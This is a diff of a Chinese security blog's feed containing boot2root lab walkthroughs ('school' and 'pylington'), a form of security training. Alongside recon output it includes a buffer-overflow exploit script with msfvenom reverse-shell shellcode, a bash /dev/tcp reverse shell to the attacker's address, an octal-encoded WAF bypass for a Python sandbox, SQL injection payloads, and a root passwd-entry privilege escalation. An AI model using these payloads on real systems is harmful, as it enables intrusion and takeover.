+<p><img data-src="./school/11.png" alt></p>
+<p><img data-src="./school/12.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./school/13.png" alt></p>
+<h3 id="后台shell"><a href="#后台shell" class="headerlink" title="后台shell"></a>后台shell</h3><p><img data-src="./school/14.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">e4ed03b4852906b6cb716fc6ce0f9fd5 (失败) 这是第一个flag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二个 <code>flag</code></li>
+</ul>
+<p><img data-src="./school/15.png" alt></p>
+<p>突破口出在这个 <code>wine /opt/access/access.exe</code> 上面</p>
+<p><img data-src="./school/16.png" alt></p>
+<p>脱下来参考网上<code>exp</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成shellcode</span></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=4444 -b '\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f' -f python</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># exp.py</span><br><span class="line">import socket</span><br><span class="line">buf&#x3D;b&#39;&#39;</span><br><span class="line">target_ip&#x3D;&#39;192.168.1.102&#39;</span><br><span class="line">target_port&#x3D;23</span><br><span class="line">recv_buf&#x3D;4096</span><br><span class="line">junk &#x3D; b&#39;a&#39; * 1902</span><br><span class="line">ret_addr&#x3D;b&#39;\xd0\x12\x50\x62&#39;</span><br><span class="line">#nops&#x3D;b&#39;\x90&#39;*32   可选</span><br><span class="line">buf +&#x3D; b&quot;\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x76\x0e\xf0\xea\x7a\x82\x83\xee\xfc\xe2\xf4\x0c\x02&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xf8\x82\xf0\xea\x1a\x0b\x15\xdb\xba\xe6\x7b\xba\x4a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x09\xa2\xe6\xf1\xd0\xe4\x61\x08\xaa\xff\x5d\x30\xa4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\x15\xd6\xbe\x91\x96\x78\xae\xd0\x2b\xb5\x8f\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2d\x98\x70\xa2\xbd\xf1\xd0\xe0\x61\x30\xbe\x7b\xa6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x6b\xfa\x13\xa2\x7b\x53\xa1\x61\x23\xa2\xf1\x39\xf1&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xcb\xe8\x09\x40\xcb\x7b\xde\xf1\x83\x26\xdb\x85\x2e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x25\x77\x83\x37\xd2\x9a\xf7\x06\xe9\x07\x7a\xcb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x97\x5e\xf7\x14\xb2\xf1\xda\xd4\xeb\xa9\xe4\x7b\xe6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x31\x09\xa8\xf6\x7b\x51\x7b\xee\xf1\x83\x20\x63\x3e&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa6\xd4\xb1\x21\xe3\xa9\xb0\x2b\x7d\x10\xb5\x25\xd8&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7b\xf8\x91\x0f\xad\x82\x49\xb0\xf0\xea\x12\xf5\x83&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd8\x25\xd6\x98\xa6\x0d\xa4\xf7\x15\xaf\x3a\x60\xeb&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x7a\x82\xd9\x2e\x2e\xd2\x98\xc3\xfa\xe9\xf0\x15\xaf&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xd2\xa0\xba\x2a\xc2\xa0\xaa\x2a\xea\x1a\xe5\xa5\x62&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x0f\x3f\xed\xe8\xf5\x82\xba\x2a\xf1\x80\x12\x80\xf0&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xfb\x26\x0b\x16\x80\x6a\xd4\xa7\x82\xe3\x27\x84\x8b&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x85\x57\x75\x2a\x0e\x8e\x0f\xa4\x72\xf7\x1c\x82\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x37\x52\xbc\x85\x57\x98\x89\x17\xe6\xf0\x63\x99\xd5&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xa7\xbd\x4b\x74\x9a\xf8\x23\xd4\x12\x17\x1c\x45\xb4&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xce\x46\x83\xf1\x67\x3e\xa6\xe0\x2c\x7a\xc6\xa4\xba&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x2c\xd4\xa6\xac\x2c\xcc\xa6\xbc\x29\xd4\x98\x93\xb6&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xbd\x76\x15\xaf\x0b\x10\xa4\x2c\xc4\x0f\xda\x12\x8a&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x77\xf7\x1a\x7d\x25\x51\x8a\x37\x52\xbc\x12\x24\x65&quot;</span><br><span class="line">buf +&#x3D; b&quot;\x57\xe7\x7d\x25\xd6\x7c\xfe\xfa\x6a\x81\x62\x85\xef&quot;</span><br><span class="line">buf +&#x3D; b&quot;\xc1\xc5\xe3\x98\x15\xe8\xf0\xb9\x85\x57&quot;  </span><br><span class="line">payload &#x3D; b&#39;&#39;</span><br><span class="line">payload +&#x3D; junk</span><br><span class="line">payload +&#x3D; ret_addr</span><br><span class="line">#payload +&#x3D; nops</span><br><span class="line">payload +&#x3D; buf</span><br><span class="line">with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as clientSock:</span><br><span class="line">    clientSock.connect((target_ip,target_port))    </span><br><span class="line">    data_from_srv &#x3D; clientSock.recv(recv_buf)    </span><br><span class="line">    print(f&quot;Reply --&gt; &#123;data_from_srv&#125;&quot;)    </span><br><span class="line">    print(f&quot;Sending --&gt; &#123;payload&#125;&quot;)    </span><br><span class="line">    clientSock.sendall(payload)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./school/17.png" alt></p>
+<p><img data-src="./school/18.png" alt></p>
+<p><img data-src="./school/19.png" alt></p>
+<p>ok!</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>other</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>综合靶场测试</tag>
       </tags>
   </entry>
   <entry>
@@ -16616,266 +16876,6 @@ git pull
       <tags>
         <tag>内网渗透测试</tag>
         <tag>单兵能力</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pylington</title>
-    <url>/2021/05/19/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/pylington/</url>
-    <content><![CDATA[<h1 id="pylington"><a href="#pylington" class="headerlink" title="pylington"></a>pylington</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
-<a id="more"></a>
-
-<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
-<li>kali2020</li>
-<li>pylington</li>
-<li>windows10</li>
-</ul>
-<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# arp-scan -l                                                                                                                                                             </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:3b:17:d5, IPv4: 192.168.43.92                                                                                                                                        </span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)                                                                                                                                     </span><br><span class="line">192.168.43.1    26:ca:cd:37:40:d8       (Unknown: locally administered)                                                                                                                                           </span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate                                                                                                                                                           </span><br><span class="line">192.168.43.252  08:00:27:bb:30:e2       PCS Systemtechnik GmbH                                                                                                                                                    </span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel                    </span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.955 seconds (130.95 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目标为 <code>192.168.43.252</code></li>
-<li><code>NMAP</code></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.43.252</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi/vulnhub/pylington# nmap -sC -sV -p- 192.168.43.252</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 07:50 EDT</span><br><span class="line">Nmap scan report for 192.168.43.252</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 bf:ba:23:4e:69:37:69:9f:23:ae:21:35:98:4d:39:fa (RSA)</span><br><span class="line">|   256 ed:95:53:52:ef:70:1f:c0:0e:3c:d8:be:35:fc:3a:93 (ECDSA)</span><br><span class="line">|_  256 2d:b8:b0:88:52:83:7b:00:47:31:a4:76:2b:3d:7d:28 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)</span><br><span class="line">|_http-generator: Jekyll v4.1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 3 disallowed entries </span><br><span class="line">|_/register /login /zbir7mn240soxhicso2z</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Unix) mod_wsgi/4.7.1 Python/3.9</span><br><span class="line">|_http-title: Pylington Cloud | The best way to run Python.</span><br><span class="line">MAC Address: 08:00:27:BB:30:E2 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目录扫描</li>
-</ul>
-<p><img data-src="./pylington/1.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@weiyi:/home/weiyi# gobuster dir -u http://192.168.43.252/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.252/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 07:50:54 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 4065]</span><br><span class="line">/register             (Status: 301) [Size: 239] [--&gt; http://192.168.43.252/register/]</span><br><span class="line">/assets               (Status: 301) [Size: 237] [--&gt; http://192.168.43.252/assets/]  </span><br><span class="line">/login                (Status: 200) [Size: 3473]                                     </span><br><span class="line">/404.html             (Status: 200) [Size: 3305]                                     </span><br><span class="line">/robots.txt           (Status: 200) [Size: 83]                                       </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/05/19 08:06:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
-
-<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
-<li>首页</li>
-</ul>
-<p><img data-src="./pylington/2.png" alt></p>
-<ul>
-<li>访问<a href="http://192.168.43.252/robots.txt" target="_blank" rel="noopener">http://192.168.43.252/robots.txt</a></li>
-</ul>
-<p><img data-src="./pylington/3.png" alt></p>
-<ul>
-<li>访问<a href="http://192.168.43.252/zbir7mn240soxhicso2z/" target="_blank" rel="noopener">http://192.168.43.252/zbir7mn240soxhicso2z/</a></li>
-</ul>
-<p><img data-src="./pylington/4.png" alt></p>
-<p>获得账号密码<code>steve / bvbkukHAeVxtjjVH</code></p>
-<h3 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h3><ul>
-<li>发现是一个<code>python</code>解释器</li>
-</ul>
-<p><img data-src="./pylington/5.png" alt></p>
-<ul>
-<li>存在<code>waf</code></li>
-</ul>
-<p><img data-src="./pylington/6.png" alt></p>
-<p><img data-src="./pylington/7.png" alt></p>
-<ul>
-<li>绕过<code>waf</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exec(<span class="number">8</span>进制)</span><br><span class="line"><span class="comment"># https://gchq.github.io/CyberChef/#recipe=To_Octal('Space')</span></span><br><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># \137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>成功执行</li>
-</ul>
-<p><img data-src="./pylington/8.png" alt></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.92&#x2F;7777 0&gt;&amp;1</span><br><span class="line">\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\61\71\62\56\61\66\70\56\64\63\56\71\62\57\67\67\67\67\40\60\76\46\61\47\51</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./pylington/9.png" alt></p>
-<p><img data-src="./pylington/10.png" alt></p>
-<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./pylington/11.png" alt></p>
-<p>或者账号密码<code>py / 54ezhCGaJV</code></p>
-<ul>
-<li>发现可以用<code>root</code>写入文件</li>
-</ul>
-<p><img data-src="./pylington/12.png" alt></p>
-<ul>
-<li>生成一个<code>root</code>权限的账号密码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@weiyi:/home/weiyi# mkpasswd -m sha-512</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash">6<span class="variable">$yp5wO2arqdD9a0BR</span><span class="variable">$nR5ztOOaCeLWM9GmPcV2b</span>/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/</span></span><br><span class="line"></span><br><span class="line">weiyi:$6$yp5wO2arqdD9a0BR$nR5ztOOaCeLWM9GmPcV2b/y44tFR9NSBizYBJoUq7QfDdKfRyRSdjvfjsL7gJTCSQc8WNvmPFliMVPbplRc2z/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="./pylington/13.png" alt></p>
-<p><img data-src="./pylington/14.png" alt></p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>other</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>综合靶场测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>school</title>
-    <url>/2021/02/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/school/</url>
-    <content><![CDATA[<h1 id="school"><a href="#school" class="headerlink" title="school"></a>school</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
-<a id="more"></a>
-
-<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
-<li>kali2020</li>
-<li>school 2 flag</li>
-<li>windows10</li>
-</ul>
-<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.1.106</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d0:76:e7:45:6f:f9       TP-LINK TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.1.102   08:00:27:53:16:13       PCS Systemtechnik GmbH</span><br><span class="line">192.168.1.105   38:d5:47:11:43:e9       ASUSTek COMPUTER INC.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目标为 <code>192.168.1.102</code></li>
-<li>NMAP</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">oot@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.1.102</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-20 00:16 EST</span><br><span class="line">Nmap scan report for 192.168.1.102</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA)</span><br><span class="line">|   256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA)</span><br><span class="line">|_  256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519)</span><br><span class="line">23/tcp open  telnet?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns, tn3270: </span><br><span class="line">|_    Verification Code:</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-title: 404 Not Found</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port23-TCP:V=7.80%I=7%D=2/20%Time=60309B24%P=x86_64-pc-linux-gnu%r(NULL</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GenericLines,</span><br><span class="line">SF:1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(tn3270,1C,"Ver</span><br><span class="line">SF:ification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(GetRequest,1C,"Verifi</span><br><span class="line">SF:cation\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(HTTPOptions,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RTSPRequest,1C,"Verificati</span><br><span class="line">SF:on\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(RPCCheck,1C,"Verification\x2</span><br><span class="line">SF:0Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSVersionBindReqTCP,1C,"Verifica</span><br><span class="line">SF:tion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(DNSStatusRequestTCP,1C,"Ve</span><br><span class="line">SF:rification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Help,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SSLSessionReq,1C,"Verificatio</span><br><span class="line">SF:n\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServerCookie,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(TLSSessionReq,1C,"Veri</span><br><span class="line">SF:fication\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(Kerberos,1C,"Verificat</span><br><span class="line">SF:ion\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SMBProgNeg,1C,"Verification</span><br><span class="line">SF:\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(X11Probe,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(FourOhFourRequest,1C,"Verification\</span><br><span class="line">SF:x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LPDString,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPSearchReq,1C,"Verification\x20C</span><br><span class="line">SF:ode:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LDAPBindReq,1C,"Verification\x20Cod</span><br><span class="line">SF:e:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(SIPOptions,1C,"Verification\x20Code:\</span><br><span class="line">SF:n\0\0\0\xee\x1e@\0\xe2\x1c")%r(LANDesk-RC,1C,"Verification\x20Code:\n\0</span><br><span class="line">SF:\0\0\xee\x1e@\0\xe2\x1c")%r(TerminalServer,1C,"Verification\x20Code:\n\</span><br><span class="line">SF:0\0\0\xee\x1e@\0\xe2\x1c")%r(NCP,1C,"Verification\x20Code:\n\0\0\0\xee\</span><br><span class="line">SF:x1e@\0\xe2\x1c")%r(NotesRPC,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\</span><br><span class="line">SF:0\xe2\x1c")%r(JavaRMI,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\</span><br><span class="line">SF:x1c")%r(WMSRequest,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c</span><br><span class="line">SF:")%r(oracle-tns,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%</span><br><span class="line">SF:r(ms-sql-s,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c")%r(afp</span><br><span class="line">SF:,1C,"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c");</span><br><span class="line">MAC Address: 08:00:27:53:16:13 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=2/20%OT=22%CT=1%CU=42722%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=60309B30%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.102</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>目录扫描</li>
-</ul>
-<p><img data-src="./school/1.png" alt></p>
-<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./school/2.png" alt></p>
-<ul>
-<li>随手一个<code>sql</code>注入，万能密码登录</li>
-</ul>
-<p><img data-src="./school/3.png" alt></p>
-<p><img data-src="./school/4.png" alt></p>
-<ul>
-<li>成功进入后台</li>
-</ul>
-<p><img data-src="./school/5.png" alt></p>
-<ul>
-<li>源代码发现提示</li>
-</ul>
-<p><img data-src="./school/6.png" alt></p>
-<p>猜测存在文件上传<code>getshell</code>操作</p>
-<h3 id="sqlmap跑一波"><a href="#sqlmap跑一波" class="headerlink" title="sqlmap跑一波"></a>sqlmap跑一波</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)</span><br><span class="line">    Payload: username=1' OR NOT 5447=5447-- LQim&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: username=1' OR (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(6992=6992,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VEgw&amp;password=1</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=1' AND (SELECT 1983 FROM (SELECT(SLEEP(5)))sPJh)-- ElNx&amp;password=1</span><br><span class="line">---</span><br><span class="line">[00:40:19] [INFO] the back-end DBMS is MySQL</span><br><span class="line">you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[00:40:23] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.1.102'</span><br><span class="line"></span><br><span class="line">[*] ending @ 00:40:23 /2021-02-20/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span 